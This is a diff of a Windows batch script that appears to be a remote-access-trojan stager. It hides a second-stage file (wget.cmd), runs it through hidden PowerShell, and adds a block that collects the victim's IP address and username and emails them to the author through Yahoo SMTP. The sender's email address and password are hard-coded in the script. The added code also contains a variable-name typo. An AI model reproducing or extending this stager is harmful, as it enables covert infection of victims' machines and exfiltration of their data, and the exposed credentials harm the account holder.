@@ -25,14 +25,25 @@ powershell -windowstyle hidden -Command ^
     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
 }"
 
+@REM setup smtp
+(
+    echo $email = "soumyahembra123@yahoo.com"
+    echo $password = "Soumya@2002"
+    echo $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress
+    echo echo "ip:$ip" > "$env:UserName.rat"
+
+    echo $subject = "$env:UserName logs"
+    echo $smpt = New-Object System.Net.Mail.SmtpClient("smtp.mail.yahoo.com","587");
+    echo $smtp.EnableSSL = $true
+    echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email,$password);
+    echo $smtp.Send($email,$email,$subject,$ip)
+) > smtp.txt
 REM hide the stage2.cmd file
 attrib +h wget.cmd
  
 REM run payload 
-@REM powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
-@REM powershell start wget.cmd
-powershell -windowstyle hidden -Command "Start-Process 'cmd.exe' -ArgumentList '/c wget.cmd' -WindowStyle Hidden"
-
+@REM powershell -windowstyle hidden -Command "Start-Process 'cmd.exe' -ArgumentList '/c wget.cmd' -WindowStyle Hidden"
+powershell ./wget.cmd
 REM cd back into initial location
 REM cd /d "%INITIALPATH%"
 
